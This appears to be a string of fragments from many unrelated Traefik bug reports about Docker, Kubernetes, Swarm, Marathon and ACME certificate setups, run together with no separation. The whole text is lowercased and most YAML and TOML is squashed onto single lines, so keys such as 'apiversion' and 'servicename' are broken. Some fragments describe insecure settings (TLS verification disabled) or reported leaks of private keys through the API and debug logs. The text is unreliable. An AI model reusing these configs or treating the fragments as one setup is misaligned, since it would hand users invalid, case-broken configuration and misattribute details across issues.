in order to verify if something is wrong with the letsencrypt side i used certbot for the same wildcard domain i have configured in traefik.toml and i was able to successfully generate the certificates.
at this point it is not clear to me from the existing documentation if i'm doing something wrong or if this is indeed a bug in traefik
the code i used to verify that certificates can be generated with certbot:
docker run -it --rm --name certbot \\ -v "/app/letsencrypt:/etc/letsencrypt" \\ -v "/var/lib/letsencrypt:/var/lib/letsencrypt" \\ certbot/dns-digitalocean certonly \\ --server \\ --dns-digitalocean \\ --dns-digitalocean-credentials /etc/letsencrypt/digitalocean.ini \\ -d *.monitor.local.example.com -d monitor.local.example.com
i run a container with the following labels:
version: \'3\' services: web: image: website:latest networks: - web labels: - "traefik.docker.network=web" - "traefik.enable=true" - "traefik.frontend.rule=host:foo.example.com,www.foo.example.com" - "traefik.port=80" - "traefik.protocol=http" - "traefik.frontend.headers.sslredirect=true" - "traefik.frontend.headers.sslforcehost=true" - "traefik.frontend.headers.sslhost=foo.example.com" networks: web: external: true ```
i specified an ingress for my service in kubernetes: ```yaml
apiversion: extensions/v1beta1
kind: ingress
metadata: annotations: kubernetes.io/ingress.class: traefik traefik.frontend.rule.type: pathprefixstrip traefik.ingress.kubernetes.io/ssl-redirect: "true" name: myingress namespace: default
spec: rules: - host: myhost http: paths: - backend: servicename: monitoring-grafana serviceport: 80 path: /mypath
``` inspecting the service on the dashboard shows it gets created properly with the correct rule.
created an ingress: ```yaml
apiversion: extensions/v1beta1
kind: ingress
metadata: name: dashboard namespace: default annotations: kubernetes.io/ingress.class: 'traefik'
spec: rules: http: paths: backend: servicename: dashboard serviceport: 8080
i was trying to deploy traefik with acme but got stuck on
unknown entrypoint \\"\\" for acme configuration
after a while i was able to figure out that this was because the acme storage file did not yet exist
[acme] storage = "/var/traefik/acme.json"
``` this was resolved with `touch /var/traefik/acme.json` <!-- - if possible, use the command `traefik bug`
see
**create proxy network**
docker network create -d overlay proxy
**traefik dockerfile**
```dockerfile
from traefik:1.7
run mkdir /customssl/ add devops-ssl/cert.pem /customssl/
add devops-ssl/cert.key /customssl/
``` **stack.yaml**
version: "3.4"
services: traefik_init: image: registry.xxx.xxx/aw-traefik:1.7 command: - "traefik" - "storeconfig" - "--api" - "--entrypoints=name:http address::80" - "--entrypoints=name:https address::443 tls:/customssl/cert.pem,/customssl/cert.key;" - "--defaultentrypoints=http" - "--accesslog" - "--accesslog.format=json" - "--docker" - "--docker.swarmmode" - "--docker.domain=swarmqa.xxx.xxx" - "--docker.watch" - "--consul" - "--consul.endpoint=consul.xxx.xxx:8500" - "--consul.prefix=traefikqa" networks: - traefik deploy: restart_policy: condition: on-failure traefik: image: registry.xxx.xxx/aw-traefik:1.7 depends_on: - traefik_init command: - "--consul" - "--consul.endpoint=consul.xxx.xxx:8500" - "--consul.prefix=traefikqa" volumes: - /var/run/docker.sock:/var/run/docker.sock networks: - proxy - traefik ports: - target: 80 published: 80 mode: host - target: 443 published: 443 mode: host - target: 8080 published: 8080 mode: host deploy: mode: global update_config: parallelism: 1 delay: 10s restart_policy: condition: on-failure networks: proxy: driver: overlay external: true traefik: driver: overlay
enabled buffering via traefik.ingress.kubernetes.io/buffering annotation on kubernetes services ```yaml traefik.ingress.kubernetes.io/buffering: | maxrequestbodybytes: 10485760 memrequestbodybytes: 2097153 maxresponsebodybytes: 10485761 memresponsebodybytes: 2097152 retryexpression: isnetworkerror() && attempts() <= 2
``` running traefik:1.7.3 due to http handler panic in 1.7.2 with same configuration
<!-- - if possible, use the command `traefik bug`
see
read the documents at #docker and #docker-swarm-mode in normal docker mode (link 1) it says that `domain` is mandatory
in docker swarm modle (link 2) it says it is optional
i believe the correct answer is that both should be optional.
i evaluated the resolution of issue #3052 in kubernetes by following a similar test to the original reporter
having set up traefik as a kubernetes ingress, i tried: 1
curl with a custom client certificate
backend is a golang server that dumps the http request (made after the example in the #3052 )
i made a simple service with json-server and tried to reach the uri
i configured trafik acording to the kubernetes guid on the doku.
set a `traefik.backend.buffering.retryexpression` label on a docker swarm backend service
the labels, as seen from `docker service inspect`
"labels": { "traefik.backend.buffering.retryexpression": "(isnetworkerror() || responsecode() == 502) && attempts() <= 2", "traefik.backend.loadbalancer.swarm": "true", "traefik.enable": "true"
``` <!-- - if possible, use the command `traefik bug`
see
deployed a marathon app with following configuration:
traefik.enable: true
traefik.frontend.rule: host:example.com
traefik.protocol: http
traefik.backend.healthcheck.path: /health
traefik.frontend.entrypoints: http
traefik.backend.loadbalancer.method: drr
traefik.frontend.errors.rapi.query: "/"
traefik.frontend.errors.rapi.backend: -api-json-errors
traefik.frontend.errors.rapi.status: 500-599
furthermore i've deployed added another marathon app for handling errors.
n/a - i'm an employee of let's encrypt and noticed in our server-side logs that traefik (versions 1.6.4 ..
1.7.2.) are responsible for a large portion of the `"urn:ietf:params:acme:error:malformed"` type error responses to neworder requests
the majority of these have the detail message `"error creating new order :: dns name ends in a period"` indicating there is probably a common mis-configuration at work traefik might be able to address.
i had traefik watching a folder for new configuration files
inside this folder i only have
configs related do ssl certitifcates
all configs are like this: ```toml
[[tls]] entrypoints = ["https"] [tls.certificate] certfile = "certfile.pem" keyfile = "keyfile.pem"
``` i have one certificate per file, and this works well
but when **any** of these files are misconfigured, traefik stops loadind the other certificates
more details bellow.
using traefik (as a replacement for envoy) for grpc bidirectional streaming api when there are client and server sending very small protobuf messages (e.g
few bytes) and "normal size" messages ( > 4kb).
proxy a websocket server <!-- - if possible, use the command `traefik bug`
see
<!-- - if possible, use the command `traefik bug`
see
--> trying to use [buffering]( #buffering) to keep oversized request bodies out of my backend services, using traefik 1.7.2 (alpine and non-alpine images)
running in kubernetes 1.10.4 on azure (not aks).
<!-- - if possible, use the command `traefik bug`
see
--> i configured traefik to serve tomcat 8.5 webapp using http2
i've got a new domain from gandi.net using gandiv5 api key to test if traefik can generate a wildcard with base domain as san.
the application gives a correct http 200 ok response
add a label with traefik.backend.loadbalancer.stickiness=true and traefik.backend.loadbalancer.stickiness.cookiename=lb_cookie
the application gives a correct http 200 ok response with a set-cookie: lb_cookie= path=/
scale the application to 2 instances in marathon
the application gives a correct http 200 ok response without a set-cookie: lb_cookie= path=/ tested with:
an app with set-cookie: jsessionid=a13d5aab82d9e8bc0015020cbff90b5a; path=/; httponly
an app with no cookies
i'm trying to use the `file.watch` feature
the idea is to be able to reload ssl certificates without restaring traefik
i have the tls config on a separated file, and here is my main config file (the part that matters): ```
watch = true
filename = "/etc/ssl.toml"
``` i have two copies of "/etc/ssl.toml", each one with a different certificate, like this: `ssl1.toml`: ```
[[tls]] entrypoints = ["https"] [tls.certificate] certfile = "/etc/cert1/fullchain.pem" keyfile = "/etc/cert1/privkey.pem" ``` and `ssl2.toml`:
[[tls]] entrypoints = ["https"] [tls.certificate] certfile = "/etc/cert2/fullchain.pem" keyfile = "/etc/cert2/privkey.pem"
``` and then what i do is just a simple `cp`, like this: ```
cp ssl2.toml ssl.toml
cp ssl1.toml ssl.toml
``` and check the certificates were reloaded with a simple curl to localhost.
i have setup traefik on kubernetes cluster running in gke
my configs:
kind: deployment
apiversion: extensions/v1beta1
metadata: name: traefik-ingress-controller namespace: default labels: k8s-app: traefik-ingress-lb
spec: replicas: 1 template: metadata: labels: app: traefik-ingress-lb name: traefik-ingress-lb spec: terminationgraceperiodseconds: 60 serviceaccountname: traefik-ingress-controller volumes: - name: config configmap: name: traefik-config containers: - image: traefik name: traefik-ingress-lb imagepullpolicy: always volumemounts: - mountpath: "/config" name: "config" ports: - name: admin containerport: 8080 hostport: 8080 - name: http containerport: 80 hostport: 80 - name: https containerport: 443 hostport: 443 args: - --web - --kubernetes - --loglevel=debug
kind: service
apiversion: v1
metadata: name: traefik-ingress-service namespace: default
spec: type: loadbalancer selector: k8s-app: traefik-ingress-lb ports: - name: http protocol: tcp port: 80 targetport: 80 - name: https protocol: tcp port: 443 targetport: 443 - name: admin protocol: tcp port: 8080
apiversion: v1
kind: service
metadata: name: traefik-web-ui namespace: default
spec: selector: k8s-app: traefik-ingress-lb ports: - protocol: tcp port: 8080
apiversion: extensions/v1beta1
kind: ingress
metadata: name: traefik-web-ui namespace: default annotations: kubernetes.io/ingress.class: traefik
spec: rules: - http: paths: - path: / backend: servicename: traefik-web-ui serviceport: 8080
<!-- - if possible, use the command `traefik bug`
see
tried to test usebindortip to avoid having the container publishing port in host mode but rather in ingress mode
* question 1 : is the variable `usebindportip` or `usebindortip` ? cf #l65 vs
* question 2 : the variable is not mentionned in the docker swarm part of the docker backend
does it mean it's not available in the swarm mode ?
* question 3 : using usebindportip (lower or camel case) with ingress mode will provide the ip of the traefik interal ip and not the external one
steps to reproduce: output of my nginx log server: with `mode:host`, without `usebindportip`, you see the header set to my lan ip (10.251.0.100) ```
# from my lan
web_web.1.dxe3rxefxdin@picocluster4 | 10.0.8.9 - - [28/sep/2018:14:28:01 +0000] "get / http/1.1" 200 612 "-" "mozilla/5.0 (macintosh; intel mac os x 10.14; rv:62.0) gecko/20100101 firefox/62.0" "10.251.0.100"
# from outside web_web.1.dxe3rxefxdin@picocluster4 | 10.0.8.9 - - [28/sep/2018:14:31:28 +0000] "get / http/1.1" 200 612 "-" "mozilla/5.0 (macintosh; intel mac os x 10.14; rv:62.0) gecko/20100101 firefox/62.0" "151.127.xxx.xxx"
``` same with `mode:ingress` and `usebindportip=true`: ```
web_web.1.dxe3rxefxdin@picocluster4 | 10.0.8.12 - - [28/sep/2018:14:40:01 +0000] "get / http/1.1" 304 0 "-" "mozilla/5.0 (macintosh; intel mac os x 10.14; rv:62.0) gecko/20100101 firefox/62.0" "10.255.0.2"
# from external access
web_web.1.dxe3rxefxdin@picocluster4 | 10.0.8.12 - - [28/sep/2018:14:40:25 +0000] "get / http/1.1" 304 0 "-" "mozilla/5.0 (macintosh; intel mac os x 10.14; rv:62.0) gecko/20100101 firefox/62.0" "10.255.0.2"
``` 10.0.8.x = network where my nginx container is deployed
10.255.0.2 is the ip of the traefik container
`traefik/docker-compose.yml` ```yaml
cat compose/docker-compose.yml
version: '3.2'
services: traefik: image: traefik:1.6.6 deploy: placement: constraints: - node.role == manager ports: - target: 80 published: 80 protocol: tcp mode: ingress (or host depending on test) - target: 443 published: 443 protocol: tcp mode: ingress (or host depending on test) volumes: - type: bind source: /var/run/docker.sock target: /var/run/docker.sock - type: bind source: /home/me/traefik/conf/traefik.toml target: /traefik.toml networks: - traefik-net
networks: traefik-net: driver: overlay attachable: true
``` `conf/traefik.toml` ```toml
defaultentrypoints = ["http", "https"] loglevel = "error" # disable certs validation as traefik will use ip to connect containres instead of hostnames, which will never validate.
insecureskipverify = true [entrypoints] [entrypoints.http] address = ":80" compress = true [entrypoints.https] address = ":443" [docker]
endpoint = "unix:///var/run/docker.sock"
domain = "traefik"
watch = true
exposedbydefault = true
swarmmode = true
usebindportip = true (or not mentionned depending on tests)
``` and `nginx/docker-compose.yml` ```yaml
version: '3.2'
services: web: image: nginx:stable-alpine deploy: labels: traefik.docker.network: "web" traefik.frontend.rule: "host:picocluster1.xxx.lan,picocluster1.home.xxx.fr" traefik.frontend.entrypoints: "http,https" traefik.port: "80" traefik.protocol: "http" traefik.frontend.passhostheader: "true" networks: - web
networks: web: driver: overlay
i'm using the traefik 1.7 docker image
when run docker container to create wildcard domains, i get time out
as soon as i run the container, i can see the txt in route 53 as shown in the image
for some reason traefik cannot validate it.
using k8s (1.10.x) and traefik 1.6.6 on barehardware.
(same thing happened with latest available image as well) 1) set up a simple deployment and service.
create 3 ingress files, like this:
apiversion: extensions/v1beta1
kind: ingress
metadata: name: simpleserver namespace: default
spec: rules: - host: simpleserver.k8s.domain.com http: paths: - backend: servicename: simpleserver-svc serviceport: 8080 path: /aaaa
run the curl against the newly created 'host', and it works just fine.
now create a second ingress
note the quote in path...
apiversion: extensions/v1beta1
kind: ingress
metadata: name: simpleserver2 namespace: default
spec: rules: - host: simpleserver2.k8s.domain.com http: paths: - backend: servicename: simpleserver-svc serviceport: 8080 path: /aaaa-"0"
the first site still continue to work
the second one will be unavailable, and there will be a parse error in the logs
now create the 3rd ingress:
apiversion: extensions/v1beta1
kind: ingress
metadata: name: simpleserver3 namespace: default
spec: rules: - host: simpleserver3k8s.domain.com http: paths: - backend: servicename: simpleserver-svc serviceport: 8080 path: /bbbb
``` 3rd site will be unavailable as well.
now remove the second ingress
the 3rd ingress will still be unavailable
the problem persists until you restart traefik.
<!-- - if possible, use the command `traefik bug`
see
--> setting tls for entrypoint `traefik` failed with traefik 1.7 with error message:
time="2018-09-28t16:42:19z" level=error msg="error creating server: open : no such file or directory"
``` traefik 1.6.6 works fine with the same configuration
deployment:
apiversion: apps/v1
kind: deployment
metadata: labels: k8s-app: traefik-ingress-controller name: traefik-ingress-controller namespace: kube-system
spec: selector: matchlabels: k8s-app: traefik-ingress-controller replicas: 1 template: metadata: labels: k8s-app: traefik-ingress-controller spec: serviceaccountname: traefik-ingress-controller containers: - name: traefik-ingress-controller image: traefik:v1.7.0-alpine args: - --kubernetes - --api - --entrypoints=name:http address::80 redirect.entrypoint:https - --entrypoints=name:https address::443 tls - --entrypoints=name:traefik address::8080 tls - --defaultentrypoints=http,https - --traefiklog - --acme.email=redacted@example.com - --acme.storage=/traefik/acme/account - --acme.httpchallenge.entrypoint=http - --acme.entrypoint=https - --acme.onhostrule - --acme.caserver= - --etcd.endpoint=etcd-traefik-client:2379 - --etcd.useapiv3 ports: - containerport: 80 name: http - containerport: 443 name: https - containerport: 8080 name: https-gui
we've noticed traefik containing an outdated configuration on several occasions
we haven't been able to identify the problem before, but yesterday we experienced that two instances which should be identical were running with different config, and were able to dig in a little bit
on the "outdated" node, we can see this error:
{"error":"unexpected response code: 500 (rpc error making call: eof)","level":"error","msg":"failed to fetch details of logstash-prod-beat-app-log-nonprod","time":"2018-09-24t06:50:24z"}
{"error":"unexpected response code: 500 (rpc error making call: eof)","level":"error","msg":"failed to retrieve health checks","time":"2018-09-24t06:50:24z"}
``` after this entry, it looks like traefik completely stops attempting to reload/listen to changes in consul, leaving it with a stale config
on the "other" node, we can see multiple "config reloads"
this aligns well with troubleshooting we've done in the past, where we've seen that even restarting consul fails to trigger traefik to reload its configuration
this fact combined with what we're seeing in the current issue leads me to believe that traefik completely stops communicating with consul when this issue occurs.
using traefik 1.7 on docker (image: traefik:latest) without defined `traefik.backend`s defined causes errors not present in 1.6.6 - no front ends appear
moreover when attempting to specify the `backend` by label no front-ends appear with the same errors...
i configured traefik with a provided certificate for `mydomain.com`, and to issue a wildcard cert for `*.mydomain.com` with letsencrypt.
configured traefik with: * http, https endpoints, with http forwarding to https.
* ssl certificate
tried to pull the latest traefik docker image from a raspberry pi 3 running raspbian.
i started traefik in a swarm cluster of 6 aws ec2 (3 master + 3 workers).
i defined 3 entrypoints http (:80) , https (:443), debug (:10000).
i started 2 services: - test1 with http & https (host: test1.my-domain.pro)
- test2 with debug only (host: stack-test2.my-domain.pro)
i am running traefik with rancher 1.6.17 i have tried traefik 1.6.5 and 1.6.6 with same results.
when i set a new service with the labels to get into traefik everything works fine
but when i upgrade it after the upgrade is complete the traefik backend is red with no containers in it
it does not put the container back in until i click "finish upgrade".
<!-- - if possible, use the command `traefik bug`
see
trying to setup a domain for use with docker swarm + traefik + wildcard letsencrypt certs over dns-01 i'm seeing what i suspect are dns challenges being run in parallel duplicated for each domain
depending on which order these run (seems random) the challenges will either fail or succeed
what happens a lot of the time is that it retries >5 times and hits lets encrypt limiting
luckily i didn't get hit with rate limiting tonight but i did get a clear log which shows the request auth keys repeating but appearing out of order leading to multiple failures before finally succeeding.
i am running traefik on top of docker swarm and when the swarm cluster loses quorum traefik does not respect the timeouts for connections and keeps opening new sockets connections until file descriptors be full and raises **too many open files**.
i noticed that after certificate is issued not all traefik nodes reload acme storage which means that in some cases web site works in some default traefik certificate is being returned
* configured acme dns challenge with the cloudflare provider
* configured domains to use wildcard certs
i am trying to setup a kubernetes ingress rules that work based on subdomain
but when i use wildcard for pointing subdomain(`*.domain.com`)
it is not recognising the rule and rest of the rules were disappeared from traefik dashboard.
<!-- - if possible, use the command `traefik bug`
see
--> i configured ns1 as dnschallenge provider and added a frontend rule for a host that is in a subdomain that is delegated to ns1
(myhost.sub.mydomain.tld)
we use traefik with multiple tls enabled entrypoints configured
* https (with acme)
* traefik (for the admin ui, with our internal selfsigned certificates)
* potentially more internally signed endpoints, like for clientssl, not listed in this report **important is**, the internal certificates sometimes contain wildcard certificates which overlap with the acme configured entrypoint
reproducible steps found here:
configured traefik with allowminweightzero = true.
configured a frontend/backend pair (pair a) with **no** healthcheck
there are two servers in the backend, one with weight 1, one with weight 0
both servers were running and able to process traffic.
configured a frontend/backend pair (pair b) with a healthcheck
there are two servers in the backend, one with weight 1, one with weight 0
both servers were running and able to process traffic.
i am testing traefik + consul backend and trying to generate a acme certificate by using `acme.tlschallenge` method
we are trying to switch to `consul` from `file` backend
in `file` backend mode all works fine.
we have a mesos & marathon (1.5.0) with 3 masters and nodes ~20 agents
on each agent we run traefik in a container configured with marathon as a backend, here is the configuration file:
loglevel = "info" [entrypoints] [entrypoints.http] address = ":80" [traefiklog] format = "json" [accesslog] format = "json" # api definition
[api] entrypoint = "traefik" dashboard = true debug = false [api.statistics] recenterrors = 10 # metrics definition
[metrics] [metrics.datadog] address = "10.x.x.x:8125" pushinterval = "10s" # enable /ping on the api port
entrypoint = "traefik" ################################################################
# mesos/marathon provider
################################################################ # enable marathon provider.
[marathon] endpoint = " " watch = true domain = "service.lan" exposedbydefault = false
``` it works well, all marathon tasks are correctly configured in traefik and traffic is correctly served.
$ go version
go version go1.10.3 linux/amd64 $ gometalinter.v2 --vendor --disable-all --enable=vet ./...
``` <!-- - if possible, use the command `traefik bug`
see
configured traefik as ingress controller for kubernetes.
enabled forward authentication with annotations in ingress objects.
ingresses point to external services:`type: externalname`
``` traefik.ingress.kubernetes.io/auth-type: forward traefik.ingress.kubernetes.io/auth-url: traefik.ingress.kubernetes.io/auth-tls-secret: tls-auth traefik.ingress.kubernetes.io/rule-type: "pathprefixstrip"
i configured traefik to use both a comodo wildcard for *.domain.tld, and acme for other domains.
python greeter_client.py
running nextcloud docker image and connect to nextcloud sync client.
i have traefik setup with consulcatalog as provider, docker registry 2 and other nginx services all registered successfully
docker pull/push doesn\'t work, resulted in "get /v2/: stopped after 10 redirects" error, tried to go to the same url with browser resulted in redirect loop between "/v2" and "/v2/" go to any other site served by nginx doesn\'t work if the url doesn\'t end in an existed file
for example "/dir/index.html" works but "/dir" got redirected to "/dir/" by nginx and again to "/dir" by treafik.
attempted to run traefik using the ecs backend
we are currently utilizing a mix of fargate and ec2 tasks
verified that traefik starts up normally when only ec2 tasks are present, but fails when any fargate tasks exist within the cluster
<!-- - if possible, use the command `traefik bug`
see
<!-- - if possible, use the command `traefik bug`
see
--> according to the doc, trying to generate a wildcard certificate using gandiv5 as provider
i tried to access
i have 3 frontends defined, each of them matching via a simple `host:` rule.
i use the file backend and define each frontend in a separate file
[file] directory = "/etc/traefik/sites/" watch = true
``` this is my logging related configuration:
[traefiklog] filepath = "/var/log/traefik/traefik.log" [accesslog] filepath = "/var/log/traefik/access.log" format = "json" [accesslog.fields] defaultmode = "drop" [accesslog.fields.names] "requesthost" = "keep" "clienthost" = "keep" "requestline" = "keep" "frontendname" = "keep" "backendaddr" = "keep" "requestprotocol" = "keep" [accesslog.fields.headers] defaultmode = "drop"
<!-- - if possible, use the command `traefik bug`
see
i have two ingresses like this:
apiversion: extensions/v1beta1
kind: ingress
metadata: name: app annotations: kubernetes.io/ingress.class: traefik traefik.frontend.priority: "2"
spec: rules: - host: test.com http: paths: - path: / backend: servicename: app serviceport: 80
apiversion: extensions/v1beta1
kind: ingress
metadata: name: maintenance annotations: kubernetes.io/ingress.class: traefik traefik.frontend.priority: "1"
spec: rules: - host: test.com http: paths: - path: / backend: servicename: maintenance serviceport: 8080
<!-- - if possible, use the command `traefik bug`
see
<!-- - if possible, use the command `traefik bug`
see
we discussed this issue with @dtomcej in slack, and he asked if i could create an issue
so here i am
i run traefik on k8s
recently i decided to try `rewrite-rule` and `request-modifier` annotations for ingress
i defined very simple ingress as follows
apiversion: extensions/v1beta1
kind: ingress
metadata: # extend with used-defined annotations annotations: kubernetes.io/ingress.class: "traefik" traefik.ingress.kubernetes.io/rewrite-target: /api/v1/products name: "my-rewrite-ingress"
spec: rules: - host: api.my-domain.com http: paths: - path: /v1/my-subpath/products backend: servicename: products serviceport: http
after creating this ingress i can see frontend pointing to the backend.
i make a request to `api.my-domain.com/v1/my-subpath/products`.
<!-- how to write a good issue? - respect the issue template as more as possible.
- if it's possible use the command `traefik bug`
see
- the title must be short and descriptive.
- explain the conditions which led you to write this issue: the context
--> i have configured some docker containers to work with traefik, and one file entry (config file below) for a jenkins not in a container
jenkins keep saying that the "inverse proxy seems to be wrongly configured", so i decided to catch some network traffic and see http headers
i found that the `x-forwarded-host` on the docker containers are the expected ones, but in the frontend of the file entry, that header, is incorrect
here is an example of request headers made from traefik to one of the containers (request is ` `): ``` get / http/1.1 host: pi.local user-agent: ..
accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 accept-encoding: gzip, deflate accept-language: es-es cookie: jenkins-timestamper-offset=-7200000 upgrade-insecure-requests: 1 x-forwarded-for: x.x.x.x x-forwarded-host: pi.casita.local x-forwarded-port: 80 x-forwarded-proto: http x-forwarded-server: eb2a2f09a409 x-real-ip: x.x.x.x
``` the `x-forwarded-host` is the expected `pi.local`
here is another example, but this time to the jenkins (request is ` `): ``` get / http/1.1 host: pi:8080 user-agent: ..
accept: */* x-forwarded-for: x.x.x.x x-forwarded-host: pi:8080 x-forwarded-port: 8080 x-forwarded-proto: https x-forwarded-server: 4dd420e65da9 x-real-ip: x.x.x.x accept-encoding: gzip
``` in this case, the `x-forwarded-host` is not `casita.melchor9000.me`, is `pi:8080`
i also tried to use the ip instead of the local domain in the backend url, but the results are the same.
<!-- - if possible, use the command `traefik bug`
see
--> here is our setup: +---------------+ +---------------+ +---------------+ +---------------+ | | | | | | | | | | | | | | | | | alb +-------> | traefik +-------> | alb1 +-----> | app | | | | | | | | | | | | | | | | | +---------------+ +---------------+ +---------------+ +---------------+ +---------------+ +---------------+ | | | | | | | | | alb2 +-----> | app | | | | | | | | | +---------------+ +---------------+ what is important is: - one backend that points to app.local.blabla.com - alb1 has a a record (aws route53) of app.local.blabla.com with a weight of 100 (multiple ips) - alb2 has a a record (aws route53) of app.local.blabla.com with a weight if 0 (multiple ips) our problem is when we deploy a new version (behind alb2)
we deploy the code
we change the weight from alb1 to alb2 (so now when we do a dns request to app.local.blabla.com we get the ips of alb2)
we delete the app behind alb1.
deploy a service (asp.net web api) to service fabric cluster
traefik does not show the backend on ui dashboard and deployed service cant be accessed from traefik port 8080
<statelessservicetype servicetypename="aspnetcorecontainerservicetype" useimplicithost="true"> <extensions> <extension name="traefik"> <labels xmlns=" "> <label key="traefik.frontend.rule">pathprefix: /api/values</label> <label key="traefik.enable">true</label> <label key="traefik.frontend.passhostheader">true</label> </labels> </extension> </extensions> </statelessservicetype> deploy service to azure service fabric cluster
<!-- - if possible, use the command `traefik bug`
see
<!-- - if possible, use the command `traefik bug`
see
when using traefik to proxy websockets, traefik will answer all ping messages and drop all pong messages instead of forwarding them to the destination and source
mening websocket opcode 9 and opcode 10, #section-5.5.2 i dug around in the source and found that the underlying problem is within oxy, added a issue there along with a pull request just applying this patch will fix issue, from my perspective, but might break backwards compatibility since some might come to rely on traefik to handle control messages
it is conceivable to add a configuration option to allow for transparency
in my opinion transparency of the proxy should be the default behavior.
when i start traffic with traefik with `--loglevel=debug` traefik logs all information it gets back from the k8s in the line `configuration received from provider kubernetes which contain the json` contains private certs data as well from ingress tls secret's.
create an ingress with a tls cert in a secret
using the consul config provider, create several frontends (with different host rules) and point them to the same backend.
turn on the `accesslog` feature.
make a http request to one of the frontend domains.
request the api simply through dashboard url with `/api` show me the content of the acme.json letsencrypt file (the private key)
` `
* starting traefik
* creates acme user account and requests certificates
* configure a new cert or have one installed which expires soon (or expired)
* restart traefik
* creates acme account **again** and requests new certificates
in our "real" processing we have a service that simply provides arbitrary downloads
to be able to reproduce the issue reliably, we replaced it with a dummy service that simply responds with random 55mb for each request
we requested data from this service with simulated limited bandwidth
we used `wget` to accomplish this with `--limit-rate` as follows:
wget --limit-rate=100k traefiktest-provider.*[munched]*.de --no-check-certificate
<!-- how to write a good issue? - if possible, use the command `traefik bug`
see
we are supporting an application that makes use of long-lived websocket connections to stream voip audio data
in order to give this application a reasonable amount of time to complete calls that are in progress when the traefik daemonset is updated, i have set `lifecycle.gracetimeout` to a very long period, per the configuration file below
additionally, `terminationgraceperiodseconds` in the daemonset's podspec has been set to the same numeric value
however, when i test this by triggering a rolling update on the daemonset, traefik terminates within 10-20 seconds, dropping the active websocket collections on the floor
<!-- - if possible, use the command `traefik bug`
see
started traefik
<!-- - if possible, use the command `traefik bug`
see
--> created traefik.toml file containing;
[docker] endpoint = "unix:///var/run/docker.sock" domain = "xxxxxxxxxxxxxxxxxxxx" exposedbydefault = true watch = true usebindportip = true
``` configured docker container as
service: test: image: xxxxxx ports: - 192.168.0.10:8080:8080
added `--cluster` flag to my kubernetes ingress configuration
i tried both with and without `--cluster.node` flag and i tried running locally with `--cluster` on my mac.
deployed traefik 1.6.3 to our organisation kubernetes cluster to use it for ingress
trying to replace nginx.
some of our services require redirects and this is configured as annotations in their ingress kubernetes manifests
when we did this using nginx the following annotation did the job:
``` apiversion: extensions/v1beta1 kind: ingress metadata: annotations: nginx.ingress.kubernetes.io/app-root: /folder/index.html
traefik has a similar annotation available as described [here](
``` apiversion: extensions/v1beta1 kind: ingress metadata: annotations: traefik.ingress.kubernetes.io/app-root: /folder/index.html
we expected it to work in a similar fashion, as is indicated by the documentation, however the requests were not forwarded
much to our surprise after an amount of testing we found that enabling the ssl-redirect flag solves the problem:
``` apiversion: extensions/v1beta1 kind: ingress metadata: annotations: traefik.ingress.kubernetes.io/ssl-redirect: "true" traefik.ingress.kubernetes.io/app-root: /folder/index.html
``` the issue here is that either this is unexpected behaviour (that redirection doesn't work without the extra flag) or it is intended and therefore documentation should be updated accordingly
i tried to provide an adequate level of detail without posting internal company data but please ask if you need more specific information or examples of any of the points mentioned in the issue.
<!-- - if possible, use the command `traefik bug`
see
<!-- - if possible, use the command `traefik bug`
see
i try to replace nginx-ingress with traefik-ingress on k8s
and i find that rewrite-target has a strange behavior
apiversion: extensions/v1beta1
kind: ingress
metadata: annotations: kubernetes.io/ingress.class: traefik traefik.ingress.kubernetes.io/rewrite-target: /demo name: traefik-test
spec: rules: - host: <traefik-domain> http: paths: - backend: servicename: tomcat-service serviceport: 8080 path: /qwe/asd
apiversion: extensions/v1beta1
kind: ingress
metadata: annotations: kubernetes.io/ingress.class: nginx nginx.ingress.kubernetes.io/rewrite-target: /demo name: nginx-test
spec: rules: - host: <nginx-domain> http: paths: - backend: servicename: tomcat-service serviceport: 8080 path: /qwe/asd
send request
config traefik load balacing <!-- how to write a good issue? - respect the issue template as more as possible.
- if it's possible use the command `traefik bug`
see
- the title must be short and descriptive.
- explain the conditions which led you to write this issue: the context
we're running traefik 1.6.4 on windows server core 1709 (also tested on 1803) in docker swarm mode
after a certain number of requests from a single machine, traefik will no longer accept traffic from this machine
other machines are able to connect and will be routed to the right container, but the original machine will not until traefik is restarted
we have reproduced this on several machines, including on-premises, and cloud iaas machines.
i want to know requests elapsed time.
<!-- - if possible, use the command `traefik bug`
see
--> i was running the traefik ingress controller on kubernetes (1.5.4), and created some ingress rules
i then upgraded to current master (d5b649bf1cb19f8b2aa72ac00dfe6b01e6c3beeb) and set a `publishedservice` name in the config a la - after doing this, traefik started panicing constantly: ```
time="2018-06-13t19:08:41z" level=error msg="error in go routine: runtime error: index out of range"
goroutine 46 [running]:
runtime/debug.stack( , , ) /usr/local/go/src/runtime/debug/stack.go:24 +
runtime/debug.printstack() /usr/local/go/src/runtime/debug/stack.go:16 +
github.com/containous/traefik/safe.defaultrecovergoroutine( , ) /go/src/github.com/containous/traefik/safe/routine.go:148 +
github.com/containous/traefik/safe.operationwithrecover.func1.1( ) /go/src/github.com/containous/traefik/safe/routine.go:156 +
panic( , ) /usr/local/go/src/runtime/panic.go:502 +
github.com/containous/traefik/provider/kubernetes.(*clientimpl).updateingressstatus( , , , , , , , , , , ...) /go/src/github.com/containous/traefik/provider/kubernetes/client.go:183 +
github.com/containous/traefik/provider/kubernetes.(*provider).updateingressstatus( , , , , , ) /go/src/github.com/containous/traefik/provider/kubernetes/kubernetes.go:385 +
github.com/containous/traefik/provider/kubernetes.(*provider).loadingresses( , , , , , ) /go/src/github.com/containous/traefik/provider/kubernetes/kubernetes.go:342 +
time="2018-06-13t19:08:41z" level=error msg="provider connection error: panic in operation: %!s(<nil>); retrying in 1.970514418s"
github.com/containous/traefik/provider/kubernetes.(*provider).provide.func1.1( , ) /go/src/github.com/containous/traefik/provider/kubernetes/kubernetes.go:139 +
github.com/containous/traefik/safe.operationwithrecover.func1( , ) /go/src/github.com/containous/traefik/safe/routine.go:160 +
github.com/containous/traefik/vendor/github.com/cenk/backoff.retrynotify( , , , , , ) /go/src/github.com/containous/traefik/vendor/github.com/cenk/backoff/retry.go:37 +
github.com/containous/traefik/provider/kubernetes.(*provider).provide.func1( ) /go/src/github.com/containous/traefik/provider/kubernetes/kubernetes.go:161 +
github.com/containous/traefik/safe.(*pool).go.func1() /go/src/github.com/containous/traefik/safe/routine.go:78 +
github.com/containous/traefik/safe.gowithrecover.func1( , ) /go/src/github.com/containous/traefik/safe/routine.go:142 +
created by github.com/containous/traefik/safe.gowithrecover /go/src/github.com/containous/traefik/safe/routine.go:136 +
``` looks like the client is expecting the ingress status to exist already - this may be as easy as fixing via a nil check.
